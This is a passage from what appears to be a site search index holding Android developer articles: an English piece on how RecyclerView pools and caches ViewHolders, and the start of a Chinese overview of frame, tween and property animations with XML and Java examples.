Now, each view type has it\u2019s own capacity. It is 5 by default, but you can change it like that: recyclerView.getRecycledViewPool() .setMaxRecycledViews(***SOME_VIEW_TYPE***, ***POOL_CAPACITY***); This is a very important point of flexibility. If you have dozens of same-type items on screen, which often change simultaneously, make the pool bigger for that view type. And if you know, that items of some view type are so rare, that they never appear on screen in quantity more than one, set the pool size 1 for that view type. Otherwise sooner or later the pool will be filled with 5 of those items, and 4 of them will just sit there unused, which is a waste of memory. The methods getRecyclerView() , putRecycledView() , clear() are public, so you can manipulate the contents of the pool. Using putRecycledView() manually, e.g. in order to prepare some ViewHolders beforehand, is a bad idea, though. You should create ViewHolder only in onCreateViewHolder() method of your Adapter, otherwise the ViewHolders can appear in states that RecyclerView doesn\u2019t expect. \u00b2 Another cool feature is that along with the getter getRecycledViewPool() there is a setter setRecycledViewPool() , so you can reuse a single pool for multiple RecycleViews. Finally, I\u2019ll note that the pool for each view type works as a stack (last in \u2014 first out). We\u2019ll see why this is good later. Ways to pool Now let\u2019s address the question of when the ViewHolders are thrown into the pool. There are 5 scenarios: A view went out of RecyclerView\u2019s bounds during scrolling. Data has changed so that the view is no longer seen. Addition to the pool happens when the disappearance animation finishes. An item in the view cache has been updated or removed. During a search for a ViewHolder, one was found in scrap or cache with position we want, but turned out to be unsuitable because of the wrong view type or id (if adapter has stable ids). \u00b3 The LayoutManager added a view at pre-layout, but didn\u2019t add that view in post-layout. The first two scenarios are pretty obvious. One thing to note, though, is that scenario 2 is triggered not only by removal of an item in question, but also, for example, by insertion of other items, which push the given item out of bounds. The other scenarios require a bit of comment. We\u2019ve not covered the view cache and scrap yet, but the idea behind scenarios 3 and 4 is simple. The pool is a place for the views we know to be \u201cdirty\u201d and requiring rebinding. ViewHolders in all caches, except for the pool, retain some of their state (most importantly, positions). All those caches are searched by position in hope that some ViewHolder can be reused as-is. By contrast, when a view goes to pool, it\u2019s state (all the flags, position, etc.) is cleared. The only things that remain are associated view and the view type. The pool is searched by the view type, as we know, and when a ViewHolder is found there, it starts a new life. Given that picture, scenarios 3 and 4 shouldn\u2019t be a mystery: for example, if we see a item in the view cache being removed, there\u2019s no point in holding it in that cache any more, since it won\u2019t be reused as-is for the same position. It\u2019s not nice to throw it away completely, though, so we throw it into the pool instead. The last scenario requires us to know what pre-layout and post-layout are. Well, let\u2019s just go ahead and figure that out! That scenario is definitely not the most crucial aspect of the pre/post-layout mechanism, but this mechanism is hugely important in general and is manifesting itself in every part of RecyclerView, so we\u2019ll have to know it anyway.","title":"RecycledViewPool"},{"location":"Android/Anatomy%20of%20RecyclerView%3Aa%20Search%20for%20a%20ViewHolder/#offtopic-pre-layout-post-layout-and-predictive-animations","text":"Consider a scenario where we have items a, b and c, of which a and b fit on the screen. We delete the b , which brings c into view: What we\u2019d like to see is c smoothly sliding from the bottom up to it\u2019s new place. But how can that happen? We know the final location of c from the new layout, but how do we know where it should slide from? It would be wrong of RecyclerView or ItemAnimator to just assume by looking at the new layout that c should come from the bottom. We might have some custom LayoutManager where it should come from the side or something. So we need some more help from the LayoutManager. Can we use the previous layout? No, there\u2019s no \u0441 there. At that point no-one new that b was going to be deleted, so laying out c was rightly considered by LayoutManager to be a waste of resources. The solution guys at Google offered is as follows. After a change in the Adapter happens, the RecyclerView requests not one but two layouts from the LayoutManager. The first one \u2014 the pre-layout, lays out items in the previous adapter state, but uses the adapter changes as a hint that it might be a good idea to lay out some extra views. In our example, since we now know that b is being deleted, we additionally lay out c , despite the fact it\u2019s out of bounds. The second one \u2014 the post-layout, is just a normal layout corresponding to the adapter state after the changes. Now, by comparing the locations of c in pre-layout and post-layout, we can animate its appearance properly. This kind of animation \u2014 when the animated view is not present either in previous layout or in the new one \u2014 is called predictive animation, which is one of the most important concepts in RecyclerView. We\u2019ll discuss it in greater detail in later parts of this series. But now let\u2019s quickly look at another example: what if b is changed instead of being deleted? This might come as a surprise, but the LayoutManager still lays out c in the pre-layout phase. Why? Because maybe the change of b would make it become smaller in height, who knows? And if b becomes smaller, c might pop up from the bottom, so we better lay it out in pre-layout. But then later, in post-layout, it appeared to be not the case, say we just changed some TextView inside b. So c is not needed, and is thrown into the pool. That\u2019s the scenario 5 of getting oneself into the pool. It is hopefully clear now and we can go back to the RecycledViewPool.","title":"Offtopic: pre-layout, post-layout and predictive animations"},{"location":"Android/Anatomy%20of%20RecyclerView%3Aa%20Search%20for%20a%20ViewHolder/#recycledviewpool-continued","text":"When we encounter one of the scenarios when a ViewHolder should go to the pool, there are still two more obstacles on its way there: it might not be recyclable and it\u2019s View might be in transient state. Recyclability Recyclability is just a flag in ViewHolder, that you can manipulate by using setIsRecyclable() method of ViewHolder class. RecycleView makes use of it as well, making ViewHolders non-recyclable during animations. Manipulating a single flag from different independent places is usually a bad idea. For example, RecyclerView calls setIsRecyclable(true) when animation ends, by you don\u2019t want it to be recyclable for some reason specific to your application. But things don\u2019t actually break in this case because calls to setIsRecyclable() are paired. That is, if you call setIsRecyclable(false) twice, then calling setIsRecyclable(true) only once doesn\u2019t make the ViewHolder recyclable, you need to call it twice as well. Transient state The View\u2019s transient state is a very similar thing. It\u2019s a flag in the View, manipulated by setHasTransientState() method, and the calls are paired as well. The View class itself doesn\u2019t use the flag, but just holds it. It serves as a hint for widgets like ListView and RecyclerView, that it\u2019s better not to reuse this View for new content at this time. You can set this flag yourself, but also the ViewPropertyAnimator (that is when you do someView.animate()\u2026 ) automatically sets it to true at the start and to false at the end of animation. \u2074 Note that if you use, for example, a ValueAnimator to animate your views, you would have to manage the transient state yourself. One last thing to note about the transient state is that it is propagated from children to parents, all the way up to the root view. So if you animate some internal view of an item in the list, not only that view, but the item\u2019s root view, which a ViewHolder holds reference to, goes to transient state. OnFailedToRecycleView If a ViewHolder about to be recycled fails either recyclability or transient state check, the onFailedToRecycleView() method of your Adapter is called. Now, this is a really important point: this method is not just a notification of an event, but a question to you on how this situation should be dealt with. Returning true from onFailedToRecycledView() means \u201crecycle it anyway\u201d. One situation where this is appropriate is when you clear all the animations and other sources of this trouble when binding a new item. Alternatively, you can deal with these things right in the onFailedToRecycledView() method. What you shouldn\u2019t do is to ignore onFailedToRecycledView() completely. One scenario in which that might hurt you is the following. Imagine you are fading in images in the items when they come into view. If the user scrolls your list fast enough, the images won\u2019t finish fading in when they go out of view, rendering the ViewHolders ineligible for recycling. So you\u2019ll have laggy scroll, and on top of that, new and new ViewHolders will be created, cluttering the memory. For Russian-speaking readers I recommend this talk by Konstantin Zaikin, where, among other things, this scenario is shown in action: https://events.yandex.ru/lib/talks/3456/ Succeeding in recycling a ViewHolder leads to a call to onViewRecycled() method, which is a good place to release heavy resources, such as images. Remember that some ViewHolder instances can end up sitting in the pool for a long time without usage, which may be a big waste of memory. We now move on to the next cache \u2014 the view cache.","title":"RecycledViewPool, continued"},{"location":"Android/Anatomy%20of%20RecyclerView%3Aa%20Search%20for%20a%20ViewHolder/#view-cache","text":"When I say \u201cview cache\u201d or just \u201ccache\u201d what I refer to is mCachedViews field found in RecyclerView.Recycler class. It\u2019s also called \u201cfirst level cache\u201d in some comments in the code. This is just an ArrayList of ViewHolders, no splitting by view types here. The default capacity is 2, and you can tweak it via setItemViewCacheSize() method of RecyclerView. As I mentioned before, the most important difference between the pool and other caches (including the view cache), is that those other caches are searched for a ViewHolder associated with given position, while the pool is searched by view type. When a ViewHolder is in the view cache, we hope to to reuse it \u201cas-is\u201d, without rebinding, at the same position as the one it was at before it got into the cache. So let\u2019s make this distinction perfectly clear: If a ViewHolder was found nowhere , it is created and bound . If a ViewHolder was found in pool , it is bound . If a ViewHolder was found in cache , there is nothing to be done. At this point one important thing becomes very clear: a ViewHolder being bound and recycled into pool ( onViewRecycled() ) is not the same thing as an item in list going in and out of visible bounds. When it goes out, its ViewHolder can go to view cache instead of pool, and when it comes in, the ViewHolder is sometimes retrieved from view cache and is not bound. If you need to track the presence of items on screen, use the onViewAttachedToWindow() and onViewDetachedFromWindow() callbacks of your Adapter. Filling pool and cache Now, to the next question: how do ViewHolders end up in the view cache? When I was talking about the scenarios, which lead to the pool, I actually deceived you a little bit. In those scenarios (except for the third one) the ViewHolder goes either to the cache or to the pool. \u2075 Let me illustrate the rules by which either the cache or the pool is selected. Say, we have empty pool and cache initially and recycle the items one by one. This is how the pool and the cache is filled (assuming default capacities and one view type): So, as long as the cache isn\u2019t full, ViewHolders go there. If it\u2019s full, a new ViewHolder pushes a ViewHolder from the \u201cother end\u201d of the cache into the pool. If a pool is already full, that ViewHolder is pushed into oblivion, to the garbage collector that is. \u2076","title":"View Cache"},{"location":"Android/Anatomy%20of%20RecyclerView%3Aa%20Search%20for%20a%20ViewHolder/#pool-and-cache-in-action","text":"Now let\u2019s look at the way pool and cache behave in a couple of actual RecyclerView usage scenarios. Consider scrolling: As we scroll downwards, there is a \u201ctail\u201d behind the currently seen items consisting of cached items and then a pooled item. When the item 8 appears on screen, no suitable ViewHolder is found in cache: no ViewHolder associated with position 8 there. So we use a pooled ViewHolder, which was previously at position 3. When item 6 disappears on top, it goes to the cache, pushing 4 into the pool. The picture is different when we start scrolling in the opposite direction: Here we find a ViewHolder for position 5 in view cache and reuse it right away, without rebinding. And that seems to be the main use-case of the cache \u2014 to make scrolling in opposite direction, to the items we\u2019ve just seen, more efficient. So if you have a news feed, the cache might be useless, since users won\u2019t go back too often. But if it\u2019s a list of things to choose from, say a gallery of wallpapers, you might want to extend the capacity of the cache. A couple of things to note here. First, what if we scroll up to view 3? Remember that the pool works like a stack, so if we didn\u2019t do anything but scrolling since the last time we saw 3, then the ViewHolder 3 will be the last one to be put into the pool and thus is now chosen to be rebound at position 3. If the data didn\u2019t change, we actually don\u2019t need to do any rebinding. You should always check in your onBindViewHolder() if you actually need to change this TextView or that ImageView etc., and this is an example of a situation when you don\u2019t. Second, notice that there is always no more than one item (per view type) in the pool while scrolling! (Of course, if you have a multi-column grid with n columns, then you\u2019ll have n items in the pool.) The other items that ended up in the pool via scenarios 2\u20135, just stay there uselessly during scrolling. Now let\u2019s look at a scenario, in which, by contrast, lots of items go into the pool: calling notifyDataSetChanged() (or notifyItemRangeChanged() with some wide range): All the ViewHolders become invalid, cache is not a suitable place for them, and they all try to go to pool. There might be not enough space for them, so some unlucky ones will be garbage collected and then created again. In contrast to scrolling, you might want a bigger pool in this situation. Another case in which a big pool is useful is jumping from one position to another programmatically via scrollToPosition() . So how do we choose the optimal size of the pool? It seems that the optimal strategy is to extend the pool right before you\u2019ll need it to be big, and shrink it right afterwards. One dirty way to implement this is the following: **recyclerView**.getRecycledViewPool().setMaxRecycledViews(0, 20);**adapter**.notifyDataSetChanged();**new** Handler().post(**new** Runnable() { @Override **public void** run() { **recyclerView**.getRecycledViewPool() .setMaxRecycledViews(0, 1); }}); Continued here: https://medium.com/@pavelshmakov/anatomy-of-recyclerview-part-1-a-search-for-a-viewholder-continued-d81c631a2b91 ^ \u00b9 In fact, even understanding public API of RecyclerView requires you to know some of the inner workings. For example, the javadoc to setHasStableIds() method tells you nothing about why would you want to use it. ^ \u00b2 E.g. the correct view type is set in createViewHolder() method right after the Adapter call, and the field is package local, so you can\u2019t set it yourself. ^ \u00b3An example when this happens: change the item, so that it\u2019s view type changes, call notifyItemChanged() . Also, disable change animations in your ItemAnimator, otherwise scenario 2 will happen. ^ \u2074 One other example of View being in transient state is EditText with some text being selected or in the process of editing. ^ \u2075 The recyclability and transient state checks come before selection between cache and pool, which to be honest doesn\u2019t make much sense to me, since views in cache are supposed to reappear exactly in the state they were when disappearing. ^ \u2076 In support version 23 this mechanism is broken by a simple off-by-one indexing mistake. The number of ViewHolders in the cache alternates between 1 and 2 as we recycle ViewHolders one by one. \u539f\u6587\u94fe\u63a5\uff1a https://medium.com/android-news/anatomy-of-recyclerview-part-1-a-search-for-a-viewholder-404ba3453714","title":"Pool and Cache in Action"},{"location":"Android/Android%20%E5%8A%A8%E7%94%BB%E6%80%BB%E7%BB%93%20Android%20%E5%8A%A8%E7%94%BB%E6%80%BB%E7%BB%93/","text":"Android \u52a8\u753b\u603b\u7ed3 Android \u52a8\u753b\u603b\u7ed3 \u5728\u65e5\u5e38\u7684Android\u5f00\u53d1\u4e2d\uff0c\u7ecf\u5e38\u4f1a\u4f7f\u7528\u5230\u52a8\u753b\uff0c\u8fd9\u91cc\u5c31\u5bf9Android\u5f00\u53d1\u4e2d\u7684\u52a8\u753b\u505a\u4e00\u4e0b\u603b\u7ed3\u3002 Android \u52a8\u753b\u5206\u7c7b \u603b\u7684\u6765\u8bf4\uff0cAndroid\u52a8\u753b\u53ef\u4ee5\u5206\u4e3a\u4e24\u7c7b\uff0c\u6700\u521d\u7684 \u4f20\u7edf\u52a8\u753b \u548cAndroid3.0 \u4e4b\u540e\u51fa\u73b0\u7684 \u5c5e\u6027\u52a8\u753b \uff1b \u4f20\u7edf\u52a8\u753b\u53c8\u5305\u62ec \u5e27\u52a8\u753b\uff08Frame Animation\uff09\u548c\u8865\u95f4\u52a8\u753b\uff08Tweened Animation\uff09\u3002 \u4f20\u7edf\u52a8\u753b \u5e27\u52a8\u753b \u5e27\u52a8\u753b\u662f\u6700\u5bb9\u6613\u5b9e\u73b0\u7684\u4e00\u79cd\u52a8\u753b\uff0c\u8fd9\u79cd\u52a8\u753b\u66f4\u591a\u7684\u4f9d\u8d56\u4e8e\u5b8c\u5584\u7684UI\u8d44\u6e90\uff0c\u4ed6\u7684\u539f\u7406\u5c31\u662f\u5c06\u4e00\u5f20\u5f20\u5355\u72ec\u7684\u56fe\u7247\u8fde\u8d2f\u7684\u8fdb\u884c\u64ad\u653e\uff0c \u4ece\u800c\u5728\u89c6\u89c9\u4e0a\u4ea7\u751f\u4e00\u79cd\u52a8\u753b\u7684\u6548\u679c\uff1b\u6709\u70b9\u7c7b\u4f3c\u4e8e\u67d0\u4e9b\u8f6f\u4ef6\u5236\u4f5cgif\u52a8\u753b\u7684\u65b9\u5f0f\u3002 frame.gif \u5982\u4e0a\u56fe\u4e2d\u7684\u4eac\u4e1c\u52a0\u8f7d\u52a8\u753b\uff0c\u4ee3\u7801\u8981\u505a\u7684\u4e8b\u60c5\u5c31\u662f\u628a\u4e00\u5e45\u5e45\u7684\u56fe\u7247\u6309\u987a\u5e8f\u663e\u793a\uff0c\u9020\u6210\u52a8\u753b\u7684\u89c6\u89c9\u6548\u679c\u3002 \u4eac\u4e1c\u52a8\u753b\u5b9e\u73b0 <?xml version=\"1.0\" encoding=\"utf-8\"?> <animation-list xmlns:android=\"http://schemas.android.com/apk/res/android\"> <item android:drawable=\"@drawable/a_0\" android:duration=\"100\" /> <item android:drawable=\"@drawable/a_1\" android:duration=\"100\" /> <item android:drawable=\"@drawable/a_2\" android:duration=\"100\" /> </animation-list> protected void onCreate(@Nullable Bundle savedInstanceState) { super.onCreate(savedInstanceState); setContentView(R.layout.activity_frame_animation); ImageView animationImg1 = (ImageView) findViewById(R.id.animation1); animationImg1.setImageResource(R.drawable.frame_anim1); AnimationDrawable animationDrawable1 = (AnimationDrawable) animationImg1.getDrawable(); animationDrawable1.start(); } \u53ef\u4ee5\u8bf4\uff0c\u56fe\u7247\u8d44\u6e90\u51b3\u5b9a\u4e86\u8fd9\u79cd\u65b9\u5f0f\u53ef\u4ee5\u5b9e\u73b0\u600e\u6837\u7684\u52a8\u753b \u5728\u6709\u4e9b\u4ee3\u7801\u4e2d\uff0c\u6211\u4eec\u8fd8\u4f1a\u770b\u5230android\uff1aoneshot=\"false\" \uff0c\u8fd9\u4e2aoneshot \u7684\u542b\u4e49\u5c31\u662f\u52a8\u753b\u6267\u884c\u4e00\u6b21\uff08true\uff09\u8fd8\u662f\u5faa\u73af\u6267\u884c\u591a\u6b21\u3002 \u8fd9\u91cc\u5176\u4ed6\u51e0\u4e2a\u52a8\u753b\u5b9e\u73b0\u65b9\u5f0f\u90fd\u662f\u4e00\u6837\uff0c\u65e0\u975e\u5c31\u662f\u56fe\u7247\u8d44\u6e90\u7684\u5dee\u5f02\u3002 \u8865\u95f4\u52a8\u753b \u8865\u95f4\u52a8\u753b\u53c8\u53ef\u4ee5\u5206\u4e3a\u56db\u79cd\u5f62\u5f0f\uff0c\u5206\u522b\u662f alpha\uff08\u6de1\u5165\u6de1\u51fa\uff09\uff0ctranslate\uff08\u4f4d\u79fb\uff09\uff0cscale\uff08\u7f29\u653e\u5927\u5c0f\uff09\uff0crotate\uff08\u65cb\u8f6c\uff09 \u3002 \u8865\u95f4\u52a8\u753b\u7684\u5b9e\u73b0\uff0c\u4e00\u822c\u4f1a\u91c7\u7528xml \u6587\u4ef6\u7684\u5f62\u5f0f\uff1b\u4ee3\u7801\u4f1a\u66f4\u5bb9\u6613\u4e66\u5199\u548c\u9605\u8bfb\uff0c\u540c\u65f6\u4e5f\u66f4\u5bb9\u6613\u590d\u7528\u3002 XML \u5b9e\u73b0 \u9996\u5148\uff0c\u5728res/anim/ \u6587\u4ef6\u5939\u4e0b\u5b9a\u4e49\u5982\u4e0b\u7684\u52a8\u753b\u5b9e\u73b0\u65b9\u5f0f alpha_anim.xml \u52a8\u753b\u5b9e\u73b0 <?xml version=\"1.0\" encoding=\"utf-8\"?> <alpha xmlns:android=\"http://schemas.android.com/apk/res/android\" android:duration=\"1000\" android:fromAlpha=\"1.0\" android:interpolator=\"@android:anim/accelerate_decelerate_interpolator\" android:toAlpha=\"0.0\" /> scale.xml \u52a8\u753b\u5b9e\u73b0 <?xml version=\"1.0\" encoding=\"utf-8\"?> <scale xmlns:android=\"http://schemas.android.com/apk/res/android\" android:duration=\"1000\" android:fromXScale=\"0.0\" android:fromYScale=\"0.0\" android:pivotX=\"50%\" android:pivotY=\"50%\" android:toXScale=\"1.0\" android:toYScale=\"1.0\"/> \u7136\u540e\uff0c\u5728Activity\u4e2d Animation animation = AnimationUtils.loadAnimation(mContext, R.anim.alpha_anim); img = (ImageView) findViewById(R.id.img); img.startAnimation(animation); \u8fd9\u6837\u5c31\u53ef\u4ee5\u5b9e\u73b0ImageView alpha \u900f\u660e\u53d8\u5316\u7684\u52a8\u753b\u6548\u679c\u3002 \u4e5f\u53ef\u4ee5\u4f7f\u7528set \u6807\u7b7e\u5c06\u591a\u4e2a\u52a8\u753b\u7ec4\u5408\uff08\u4ee3\u7801\u6e90\u81eaAndroid SDK API\uff09 <?xml version=\"1.0\" encoding=\"utf-8\"?> <set xmlns:android=\"http://schemas.android.com/apk/res/android\" android:interpolator=\"@[package:]anim/interpolator_resource\" android:shareInterpolator=[\"true\" | \"false\"] > <alpha android:fromAlpha=\"float\" android:toAlpha=\"float\" /> <scale android:fromXScale=\"float\" android:toXScale=\"float\" android:fromYScale=\"float\" android:toYScale=\"float\" android:pivotX=\"float\" android:pivotY=\"float\" /> <translate android:fromXDelta=\"float\" android:toXDelta=\"float\" android:fromYDelta=\"float\" android:toYDelta=\"float\" /> <rotate android:fromDegrees=\"float\" android:toDegrees=\"float\" android:pivotX=\"float\" android:pivotY=\"float\" /> <set> ... </set> </set> \u53ef\u4ee5\u770b\u5230\u7ec4\u5408\u52a8\u753b\u662f\u53ef\u4ee5\u5d4c\u5957\u4f7f\u7528\u7684\u3002 \u5404\u4e2a\u52a8\u753b\u5c5e\u6027\u7684\u542b\u4e49\u7ed3\u5408\u52a8\u753b\u81ea\u8eab\u7684\u7279\u70b9\u5e94\u8be5\u5f88\u597d\u7406\u89e3\uff0c\u5c31\u4e0d\u4e00\u4e00\u9610\u8ff0\u4e86\uff1b\u8fd9\u91cc\u4e3b\u8981\u8bf4\u4e00\u4e0b interpolator \u548c pivot \u3002 Interpolator \u4e3b\u8981\u4f5c\u7528\u662f\u53ef\u4ee5\u63a7\u5236\u52a8\u753b\u7684\u53d8\u5316\u901f\u7387 \uff0c\u5c31\u662f\u52a8\u753b\u8fdb\u884c\u7684\u5feb\u6162\u8282\u594f\u3002 Android \u7cfb\u7edf\u5df2\u7ecf\u4e3a\u6211\u4eec\u63d0\u4f9b\u4e86\u4e00\u4e9bInterpolator \uff0c\u6bd4\u5982 accelerate_decelerate_interpolator\uff0caccelerate_interpolator\u7b49\u3002\u66f4\u591a\u7684interpolator \u53ca\u5176\u542b\u4e49\u53ef\u4ee5\u5728Android SDK \u4e2d\u67e5\u770b\u3002\u540c\u65f6\u8fd9\u4e2aInterpolator\u4e5f\u662f\u53ef\u4ee5\u81ea\u5b9a\u4e49\u7684\uff0c\u8fd9\u4e2a\u540e\u9762\u8fd8\u4f1a\u63d0\u5230\u3002 pivot \u51b3\u5b9a\u4e86\u5f53\u524d\u52a8\u753b\u6267\u884c\u7684\u53c2\u8003\u4f4d\u7f6e pivot \u8fd9\u4e2a\u5c5e\u6027\u4e3b\u8981\u662f\u5728translate \u548c scale \u52a8\u753b\u4e2d\uff0c\u8fd9\u4e24\u79cd\u52a8\u753b\u90fd\u7275\u626f\u5230view \u7684\u201c\u7269\u7406\u4f4d\u7f6e\u201c\u53d1\u751f\u53d8\u5316\uff0c\u6240\u4ee5\u9700\u8981\u4e00\u4e2a\u53c2\u8003\u70b9\u3002\u800cpivotX\u548cpivotY\u5c31\u5171\u540c\u51b3\u5b9a\u4e86\u8fd9\u4e2a\u70b9\uff1b\u5b83\u7684\u503c\u53ef\u4ee5\u662ffloat\u6216\u8005\u662f\u767e\u5206\u6bd4\u6570\u503c\u3002 \u6211\u4eec\u4ee5pivotX\u4e3a\u4f8b\uff0c pivotX\u53d6\u503c \u542b\u4e49 10 \u8ddd\u79bb\u52a8\u753b\u6240\u5728view\u81ea\u8eab\u5de6\u8fb9\u7f1810\u50cf\u7d20 10% \u8ddd\u79bb\u52a8\u753b\u6240\u5728view\u81ea\u8eab\u5de6\u8fb9\u7f18 \u7684\u8ddd\u79bb\u662f\u6574\u4e2aview\u5bbd\u5ea6\u768410% 10%p \u8ddd\u79bb\u52a8\u753b\u6240\u5728view\u7236\u63a7\u4ef6\u5de6\u8fb9\u7f18\u7684\u8ddd\u79bb\u662f\u6574\u4e2aview\u5bbd\u5ea6\u768410% pivotY \u4e5f\u662f\u76f8\u540c\u7684\u539f\u7406\uff0c\u53ea\u4e0d\u8fc7\u53d8\u6210\u7684\u7eb5\u5411\u7684\u4f4d\u7f6e\u3002\u5982\u679c\u8fd8\u662f\u4e0d\u660e\u767d\u53ef\u4ee5\u53c2\u8003 \u6e90\u7801 \uff0c\u5728Tweened Animation\u4e2d\u7ed3\u5408seekbar\u7684\u6ed1\u52a8\u89c2\u5bdfrotate\u7684\u53d8\u5316\u7406\u89e3\u3002 rotate1.gif Java \u76f4\u63a5\u5b9e\u73b0 \u6709\u65f6\u5019\uff0c\u52a8\u753b\u7684\u5c5e\u6027\u503c\u53ef\u80fd\u9700\u8981\u52a8\u6001\u7684\u8c03\u6574\uff0c\u8fd9\u4e2a\u65f6\u5019\u4f7f\u7528xml \u5c31\u4e0d\u5408\u9002\u4e86\uff0c\u9700\u8981\u4f7f\u7528java\u4ee3\u7801\u5b9e\u73b0 private void RotateAnimation() { animation = new RotateAnimation(-deValue, deValue, Animation.RELATIVE_TO_SELF, pxValue, Animation.RELATIVE_TO_SELF, pyValue); animation.setDuration(timeValue); if (keep.isChecked()) { animation.setFillAfter(true); } else { animation.setFillAfter(false); } if (loop.isChecked()) { animation.setRepeatCount(-1); } else { animation.setRepeatCount(0); } if (reverse.isChecked()) { animation.setRepeatMode(Animation.REVERSE); } else { animation.setRepeatMode(Animation.RESTART); } img.startAnimation(animation); } \u8fd9\u91ccanimation.setFillAfter\u51b3\u5b9a\u4e86\u52a8\u753b\u5728\u64ad\u653e\u7ed3\u675f\u65f6\u662f\u5426\u4fdd\u6301\u6700\u7ec8\u7684\u72b6\u6001\uff1banimation.setRepeatCount\u548canimation.setRepeatMode \u51b3\u5b9a\u4e86\u52a8\u753b\u7684\u91cd\u590d\u6b21\u6570\u53ca\u91cd\u590d\u65b9\u5f0f\uff0c\u5177\u4f53\u7ec6\u8282\u53ef\u67e5\u770b\u6e90\u7801\u7406\u89e3\u3002 \u597d\u4e86\uff0c\u4f20\u7edf\u52a8\u753b\u7684\u5185\u5bb9\u5c31\u8bf4\u5230\u8fd9\u91cc\u4e86\u3002 \u5c5e\u6027\u52a8\u753b \u5c5e\u6027\u52a8\u753b\uff0c\u987e\u540d\u601d\u4e49\u5b83\u662f\u5bf9\u4e8e\u5bf9\u8c61\u5c5e\u6027\u7684\u52a8\u753b\u3002\u56e0\u6b64\uff0c\u6240\u6709\u8865\u95f4\u52a8\u753b\u7684\u5185\u5bb9\uff0c\u90fd\u53ef\u4ee5\u901a\u8fc7\u5c5e\u6027\u52a8\u753b\u5b9e\u73b0\u3002 \u5c5e\u6027\u52a8\u753b\u5165\u95e8 \u9996\u5148\u6211\u4eec\u6765\u770b\u770b\u5982\u4f55\u7528\u5c5e\u6027\u52a8\u753b\u5b9e\u73b0\u4e0a\u9762\u8865\u95f4\u52a8\u753b\u7684\u6548\u679c private void RotateAnimation() { ObjectAnimator anim = ObjectAnimator.ofFloat(myView, \"rotation\", 0f, 360f); anim.setDuration(1000); anim.start(); } private void AlpahAnimation() { ObjectAnimator anim = ObjectAnimator.ofFloat(myView, \"alpha\", 1.0f, 0.8f, 0.6f, 0.4f, 0.2f, 0.0f); anim.setRepeatCount(-1); anim.setRepeatMode(ObjectAnimator.REVERSE); anim.setDuration(2000); anim.start(); } \u8fd9\u4e24\u4e2a\u65b9\u6cd5\u7528\u5c5e\u6027\u52a8\u753b\u7684\u65b9\u5f0f\u5206\u522b\u5b9e\u73b0\u4e86\u65cb\u8f6c\u52a8\u753b\u548c\u6de1\u5165\u6de1\u51fa\u52a8\u753b\uff0c\u5176\u4e2dsetDuration\u3001setRepeatMode\u53casetRepeatCount\u548c\u8865\u95f4\u52a8\u753b\u4e2d\u7684\u6982\u5ff5\u662f\u4e00\u6837\u7684\u3002 \u53ef\u4ee5\u770b\u5230\uff0c\u5c5e\u6027\u52a8\u753b\u8c8c\u4f3c\u5f3a\u5927\u4e86\u8bb8\u591a\uff0c\u5b9e\u73b0\u5f88\u65b9\u4fbf\uff0c\u540c\u65f6\u52a8\u753b\u53ef\u53d8\u5316\u7684\u503c\u4e5f\u6709\u4e86\u66f4\u591a\u7684\u9009\u62e9\uff0c\u52a8\u753b\u6240\u80fd\u5448\u73b0\u7684\u7ec6\u8282\u4e5f\u66f4\u591a\u3002 \u5f53\u7136\u5c5e\u6027\u52a8\u753b\u4e5f\u662f\u53ef\u4ee5\u7ec4\u5408\u5b9e\u73b0\u7684 ObjectAnimator alphaAnim = ObjectAnimator.ofFloat(myView, \"alpha\", 1.0f, 0.5f, 0.8f, 1.0f); ObjectAnimator scaleXAnim = ObjectAnimator.ofFloat(myView, \"scaleX\", 0.0f, 1.0f); ObjectAnimator scaleYAnim = ObjectAnimator.ofFloat(myView, \"scaleY\", 0.0f, 2.0f); ObjectAnimator rotateAnim = ObjectAnimator.ofFloat(myView, \"rotation\", 0, 360); ObjectAnimator transXAnim = ObjectAnimator.ofFloat(myView, \"translationX\", 100, 400); ObjectAnimator transYAnim = ObjectAnimator.ofFloat(myView, \"tranlsationY\", 100, 750); AnimatorSet set = new AnimatorSet(); set.playTogether(alphaAnim, scaleXAnim, scaleYAnim, rotateAnim, transXAnim, transYAnim); // set.playSequentially(alphaAnim, scaleXAnim, scaleYAnim, rotateAnim, transXAnim, transYAnim); set.setDuration(3000); set.start(); \u53ef\u4ee5\u770b\u5230\u8fd9\u4e9b\u52a8\u753b\u53ef\u4ee5\u540c\u65f6\u64ad\u653e\uff0c\u6216\u8005\u662f\u6309\u5e8f\u64ad\u653e\u3002 \u5c5e\u6027\u52a8\u753b\u6838\u5fc3\u539f\u7406 \u5728\u4e0a\u9762\u5b9e\u73b0\u5c5e\u6027\u52a8\u753b\u7684\u65f6\u5019\uff0c\u6211\u4eec\u53cd\u590d\u7684\u4f7f\u7528\u5230\u4e86ObjectAnimator \u8fd9\u4e2a\u7c7b\uff0c\u8fd9\u4e2a\u7c7b\u7ee7\u627f\u81eaValueAnimator\uff0c\u4f7f\u7528\u8fd9\u4e2a\u7c7b\u53ef\u4ee5\u5bf9\u4efb\u610f\u5bf9\u8c61\u7684 \u4efb\u610f\u5c5e\u6027 \u8fdb\u884c\u52a8\u753b\u64cd\u4f5c\u3002\u800cValueAnimator\u662f\u6574\u4e2a\u5c5e\u6027\u52a8\u753b\u673a\u5236\u5f53\u4e2d\u6700\u6838\u5fc3\u7684\u4e00\u4e2a\u7c7b\uff1b\u8fd9\u70b9\u4ece\u4e0b\u9762\u7684\u56fe\u7247\u4e5f\u53ef\u4ee5\u770b\u51fa\u3002 valueanimator.png \u5c5e\u6027\u52a8\u753b\u6838\u5fc3\u539f\u7406\uff0c\u6b64\u56fe\u6765\u81ea\u4e8eAndroid SDK API \u6587\u6863\u3002 